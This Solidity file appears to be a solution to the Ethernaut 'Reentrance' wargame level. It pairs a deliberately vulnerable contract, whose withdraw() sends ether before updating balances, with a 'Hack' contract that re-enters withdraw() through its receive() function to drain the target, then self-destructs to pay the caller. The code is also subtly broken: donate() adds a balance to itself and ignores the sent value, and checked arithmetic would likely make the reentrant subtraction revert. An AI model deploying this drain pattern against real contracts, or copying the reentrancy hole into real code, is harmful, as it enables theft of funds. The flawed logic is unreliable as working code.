// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Reentrance {
  
  //using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] += balances[_to];
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

interface IReentrance {
  function donate(address _donator) external payable;
  function withdraw(uint) external;
}

contract Hack {
  //immutable keyword permits target to be reassigned at the constructor
  IReentrance private immutable target;

  constructor(address _target) {
    target = IReentrance(_target);
  }

  function attack() external payable {
    target.donate{value: 1e17}(address(this));
    target.withdraw(1e17);

    require(address(target).balance == 0, "target balance > 0");
    //any value inside this contract is sent to my account
    selfdestruct(payable(msg.sender));
  }

  receive() external payable {
    uint amount = min(1e17, address(target).balance);
    //call the withdraw till there is ether in the target contract
    if(amount > 0){
      target.withdraw(amount);
    }

  }

  function min(uint a, uint b) private pure returns(uint) {
    return a <= b ? a : b;
  }

}
